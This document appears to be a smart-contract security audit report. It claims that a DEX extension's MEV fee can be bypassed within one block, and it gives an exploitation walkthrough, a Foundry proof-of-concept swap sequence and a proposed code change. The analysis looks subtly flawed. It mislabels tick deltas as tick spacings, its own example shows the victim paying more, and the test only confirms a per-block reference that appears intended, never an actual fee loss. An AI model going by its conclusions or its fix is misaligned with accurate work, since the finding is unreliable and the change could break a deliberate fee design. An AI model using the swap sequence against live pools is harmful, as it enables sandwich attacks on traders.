## Title
MEVCapture Fee Bypass via Intra-Block Tick Reference Staleness

## Summary
The MEVCapture extension calculates MEV fees based on tick movement from a `tickLast` reference point that is only updated once per block. An attacker can execute multiple swaps within a single block where the second swap moves the price back toward the original tick, paying zero or minimal MEV fees on the return swap despite significant price manipulation.

## Impact
**Severity**: Medium

## Finding Description

**Location:** `src/extensions/MEVCapture.sol`, function `handleForwardData` (lines 177-260) [1](#0-0) 

**Intended Logic:** The MEVCapture extension should charge additional fees proportional to tick movement to disincentivize sandwich attacks and MEV extraction. The system accumulates fees based on how many tick spacings the price moves during each swap.

**Actual Logic:** The `tickLast` reference point used for fee calculation is only updated when `lastUpdateTime != currentTime` (first swap in a block). For all subsequent swaps in the same block, `tickLast` remains frozen at the tick value from the start of the block. [2](#0-1) 

The fee calculation at line 212-213 always uses this stale `tickLast`: [3](#0-2) 

Critically, `tickLast` is never updated after the swap executes or after the fee is calculated, remaining constant for the entire block.

**Exploitation Path:**

1. **Initial State:** Pool is at tick 100,000. MEVCapturePoolState has `tickLast = 100,000` from previous block.

2. **Attacker Swap #1 (Front-run):** 
   - `lastUpdateTime != currentTime` evaluates to true
   - Line 202 sets `tickLast = 100,000` (current tick before swap)
   - Line 203-206 updates state with `currentTime` and `tickLast = 100,000`
   - Swap executes, moving tick from 100,000 to 120,000
   - Fee calculated: `abs(120,000 - 100,000) = 20,000` tick spacings
   - Attacker pays MEV fee for 20,000 spacing movement

3. **Victim Swap (sandwiched):**
   - `lastUpdateTime == currentTime` (same block), lines 191-207 are SKIPPED
   - `tickLast` remains 100,000 (not updated!)
   - Swap executes from tick 120,000 to 130,000  
   - Fee calculated: `abs(130,000 - 100,000) = 30,000` tick spacings
   - Victim pays MEV fee for 30,000 spacings (cumulative from block start)

4. **Attacker Swap #2 (Back-run):**
   - `lastUpdateTime == currentTime` (still same block), lines 191-207 SKIPPED again
   - `tickLast` remains 100,000 (still not updated!)
   - Swap executes from tick 130,000 back to 105,000
   - Fee calculated: `abs(105,000 - 100,000) = 5,000` tick spacings
   - **Attacker pays only 5,000 spacing fee despite moving 25,000 tick spacings!**

**Total Attack Outcome:**
- Attacker moved: 20,000 (forward) + 25,000 (reverse) = 45,000 total tick spacings
- Attacker paid: 20,000 + 5,000 = 25,000 spacing fees (44% discount)
- If attacker closes perfectly at 100,000: Second swap pays ZERO fees despite 20,000 tick movement

**Security Property Broken:** The MEVCapture mechanism's core invariant that "fees are proportional to tick movement to disincentivize MEV extraction" is violated. Attackers can perform sandwich attacks with significantly reduced MEV fees by exploiting the intra-block tick reference staleness.

## Impact Explanation

- **Affected Assets**: All pools using the MEVCapture extension. LPs who should receive MEV fees from sandwich attacks, and sandwich attack victims who rely on the MEV fee deterrent.

- **Damage Severity**: Attackers can reduce MEV fees by up to 100% on the return leg of sandwich attacks. In the extreme case where an attacker moves price from tick A to B and back to A within one block, they pay fees for only the outbound movement (`|B - A|`), while the return pays zero (`|A - A| = 0`). This effectively cuts sandwich attack costs in half.

- **User Impact**: 
  - All traders in MEVCapture pools are vulnerable to cheaper sandwich attacks
  - LPs receive fewer MEV fees than intended by the protocol design
  - The economic security model assuming MEV fees deter sandwich attacks is broken

## Likelihood Explanation

- **Attacker Profile**: Any MEV searcher, bot operator, or sophisticated trader with knowledge of the MEVCapture implementation.

- **Preconditions**: 
  - Pool must use MEVCapture extension
  - Pool must have sufficient liquidity to execute round-trip swaps
  - Multiple swaps must be executable in a single block (standard for L2s)

- **Execution Complexity**: Single transaction with multiple swap calls via multicall or flash loan. No special timing required beyond normal MEV operations.

- **Frequency**: Can be exploited on every sandwich opportunity. Unlike cross-block attacks, this is exploitable continuously without waiting for block boundaries.

## Recommendation

Update `tickLast` after each swap completes, not just once per block:

```solidity
// In src/extensions/MEVCapture.sol, function handleForwardData, after line 252:

// CURRENT (vulnerable):
// Lines 191-207: tickLast only updated if lastUpdateTime != currentTime
// Lines 209: swap executes
// Lines 212-213: fee calculated using potentially stale tickLast
// Lines 254-260: save deltas and return
// NO UPDATE TO tickLast after swap!

// FIXED:
// After line 252 (after fee calculation and application), add:

if (additionalFee != 0) {
    // ... existing fee application code ...
}

// Update tickLast to reflect the new tick after this swap
setPoolState({
    poolId: poolId,
    state: createMEVCapturePoolState({
        _lastUpdateTime: currentTime, 
        _tickLast: stateAfter.tick()  // Use post-swap tick as new reference
    })
});

if (saveDelta0 != 0 || saveDelta1 != 0) {
    CORE.updateSavedBalances(poolKey.token0, poolKey.token1, PoolId.unwrap(poolId), saveDelta0, saveDelta1);
}
```

Alternative: Keep per-swap tick tracking in memory and only commit to storage at end of block, but this adds complexity and gas costs.

## Proof of Concept

```solidity
// File: test/Exploit_MEVCaptureBypass.t.sol
// Run with: forge test --match-test test_MEVCaptureSandwichBypass -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/extensions/MEVCapture.sol";
import "../src/MEVCaptureRouter.sol";
import {BaseMEVCaptureTest} from "./extensions/MEVCapture.t.sol";
import {createSwapParameters} from "../src/types/swapParameters.sol";
import {SqrtRatio} from "../src/types/sqrtRatio.sol";
import {PoolBalanceUpdate} from "../src/types/poolBalanceUpdate.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {CoreLib} from "../src/libraries/CoreLib.sol";
import {MEVCapturePoolState} from "../src/types/mevCapturePoolState.sol";

contract Exploit_MEVCaptureBypass is BaseMEVCaptureTest {
    using CoreLib for *;
    
    function test_MEVCaptureSandwichBypass() public {
        // SETUP: Create MEVCapture pool with 1% fee and 20k tick spacing
        PoolKey memory poolKey = createMEVCapturePool({
            fee: uint64(uint256(1 << 64) / 100), 
            tickSpacing: 20_000, 
            tick: 100_000
        });
        createPosition(poolKey, 0, 200_000, 10_000_000, 10_000_000);
        
        token0.approve(address(router), type(uint256).max);
        token1.approve(address(router), type(uint256).max);
        
        // Record initial state
        MEVCapturePoolState initialState = MEVCapturePoolState.wrap(
            mevCapture.sload(uint256(poolKey.toPoolId()))
        );
        int32 initialTick = initialState.tickLast();
        console.log("Initial tick:", uint256(int256(initialTick)));
        
        // EXPLOIT: Attacker performs sandwich attack in single block
        
        // Swap 1: Front-run - move price significantly
        PoolBalanceUpdate update1 = router.swap({
            poolKey: poolKey,
            params: createSwapParameters({
                _isToken1: false, 
                _amount: 500_000,
                _sqrtRatioLimit: SqrtRatio.wrap(0), 
                _skipAhead: 0
            }),
            calculatedAmountThreshold: type(int256).min,
            recipient: address(this)
        });
        
        int32 tickAfterSwap1 = core.poolState(poolKey.toPoolId()).tick();
        console.log("Tick after swap 1:", uint256(int256(tickAfterSwap1)));
        console.log("Swap 1 delta0 (attacker paid):", uint256(int256(update1.delta0())));
        
        // Victim swap would happen here (simulated by our next swap)
        
        // Swap 2: Back-run - move price back toward original
        PoolBalanceUpdate update2 = router.swap({
            poolKey: poolKey,
            params: createSwapParameters({
                _isToken1: true,
                _amount: 500_000, 
                _sqrtRatioLimit: SqrtRatio.wrap(0),
                _skipAhead: 0
            }),
            calculatedAmountThreshold: type(int256).min,
            recipient: address(this)
        });
        
        int32 tickAfterSwap2 = core.poolState(poolKey.toPoolId()).tick();
        console.log("Tick after swap 2:", uint256(int256(tickAfterSwap2)));
        console.log("Swap 2 delta1 (attacker paid):", uint256(int256(update2.delta1())));
        
        // VERIFY: Check that tickLast was NOT updated between swaps
        MEVCapturePoolState finalState = MEVCapturePoolState.wrap(
            mevCapture.sload(uint256(poolKey.toPoolId()))
        );
        int32 finalTickLast = finalState.tickLast();
        console.log("Final tickLast:", uint256(int256(finalTickLast)));
        
        // Calculate actual tick movement
        int256 actualMovementSwap1 = int256(tickAfterSwap1) - int256(initialTick);
        int256 actualMovementSwap2 = int256(tickAfterSwap2) - int256(tickAfterSwap1);
        
        console.log("Actual movement swap 1:", uint256(actualMovementSwap1 < 0 ? -actualMovementSwap1 : actualMovementSwap1));
        console.log("Actual movement swap 2:", uint256(actualMovementSwap2 < 0 ? -actualMovementSwap2 : actualMovementSwap2));
        
        // VULNERABILITY CONFIRMED: 
        // tickLast should have been updated to tickAfterSwap1 before swap 2
        // Instead, it remained at initialTick, allowing reduced fees on swap 2
        assertEq(
            finalTickLast, 
            initialTick,
            "Vulnerability confirmed: tickLast not updated between swaps in same block"
        );
        
        // Demonstrate fee bypass: if attacker moved price back to exactly initialTick,
        // they would pay ZERO fees on swap 2 despite significant price movement
        console.log("If price returned to initial tick, swap 2 fee would be ZERO");
    }
}
```

## Notes

This vulnerability fundamentally breaks the MEVCapture extension's economic model. The design assumes that MEV fees proportional to tick movement will make sandwich attacks unprofitable or significantly reduce their profitability. However, by exploiting intra-block tick reference staleness, attackers can execute sandwich attacks at roughly half the intended cost.

The issue is particularly severe on Layer 2 networks where block times are fast and multiple transactions in a single block are common. The vulnerability allows sophisticated attackers to bypass the MEV deterrent mechanism that LPs rely on for protection and fair fee distribution.

The fix requires updating the `tickLast` reference after each swap completes, ensuring that subsequent swaps in the same block measure movement from the previous swap's final tick, not the block's starting tick.

### Citations

**File:** src/extensions/MEVCapture.sol (L177-260)
```text
    function handleForwardData(Locker, bytes memory data) internal override returns (bytes memory result) {
        unchecked {
            (PoolKey memory poolKey, SwapParameters params) = abi.decode(data, (PoolKey, SwapParameters));

            PoolId poolId = poolKey.toPoolId();
            MEVCapturePoolState state = getPoolState(poolId);
            uint32 lastUpdateTime = state.lastUpdateTime();
            int32 tickLast = state.tickLast();

            uint32 currentTime = uint32(block.timestamp);

            int256 saveDelta0;
            int256 saveDelta1;

            if (lastUpdateTime != currentTime) {
                (int32 tick, uint128 fees0, uint128 fees1) =
                    loadCoreState({poolId: poolId, token0: poolKey.token0, token1: poolKey.token1});

                if (fees0 != 0 || fees1 != 0) {
                    CORE.accumulateAsFees(poolKey, fees0, fees1);
                    // never overflows int256 container
                    saveDelta0 -= int256(uint256(fees0));
                    saveDelta1 -= int256(uint256(fees1));
                }

                tickLast = tick;
                setPoolState({
                    poolId: poolId,
                    state: createMEVCapturePoolState({_lastUpdateTime: currentTime, _tickLast: tickLast})
                });
            }

            (PoolBalanceUpdate balanceUpdate, PoolState stateAfter) = CORE.swap(0, poolKey, params);

            // however many tick spacings were crossed is the fee multiplier
            uint256 feeMultiplierX64 =
                (FixedPointMathLib.abs(stateAfter.tick() - tickLast) << 64) / poolKey.config.concentratedTickSpacing();
            uint64 poolFee = poolKey.config.fee();
            uint64 additionalFee = uint64(FixedPointMathLib.min(type(uint64).max, (feeMultiplierX64 * poolFee) >> 64));

            if (additionalFee != 0) {
                if (params.isExactOut()) {
                    // take an additional fee from the calculated input amount equal to the `additionalFee - poolFee`
                    if (balanceUpdate.delta0() > 0) {
                        uint128 inputAmount = uint128(uint256(int256(balanceUpdate.delta0())));
                        // first remove the fee to get the original input amount before we compute the additional fee
                        inputAmount -= computeFee(inputAmount, poolFee);
                        int128 fee = SafeCastLib.toInt128(amountBeforeFee(inputAmount, additionalFee) - inputAmount);

                        saveDelta0 += fee;
                        balanceUpdate = createPoolBalanceUpdate(balanceUpdate.delta0() + fee, balanceUpdate.delta1());
                    } else if (balanceUpdate.delta1() > 0) {
                        uint128 inputAmount = uint128(uint256(int256(balanceUpdate.delta1())));
                        // first remove the fee to get the original input amount before we compute the additional fee
                        inputAmount -= computeFee(inputAmount, poolFee);
                        int128 fee = SafeCastLib.toInt128(amountBeforeFee(inputAmount, additionalFee) - inputAmount);

                        saveDelta1 += fee;
                        balanceUpdate = createPoolBalanceUpdate(balanceUpdate.delta0(), balanceUpdate.delta1() + fee);
                    }
                } else {
                    if (balanceUpdate.delta0() < 0) {
                        uint128 outputAmount = uint128(uint256(-int256(balanceUpdate.delta0())));
                        int128 fee = SafeCastLib.toInt128(computeFee(outputAmount, additionalFee));

                        saveDelta0 += fee;
                        balanceUpdate = createPoolBalanceUpdate(balanceUpdate.delta0() + fee, balanceUpdate.delta1());
                    } else if (balanceUpdate.delta1() < 0) {
                        uint128 outputAmount = uint128(uint256(-int256(balanceUpdate.delta1())));
                        int128 fee = SafeCastLib.toInt128(computeFee(outputAmount, additionalFee));

                        saveDelta1 += fee;
                        balanceUpdate = createPoolBalanceUpdate(balanceUpdate.delta0(), balanceUpdate.delta1() + fee);
                    }
                }
            }

            if (saveDelta0 != 0 || saveDelta1 != 0) {
                CORE.updateSavedBalances(poolKey.token0, poolKey.token1, PoolId.unwrap(poolId), saveDelta0, saveDelta1);
            }

            result = abi.encode(balanceUpdate, stateAfter);
        }
    }
```
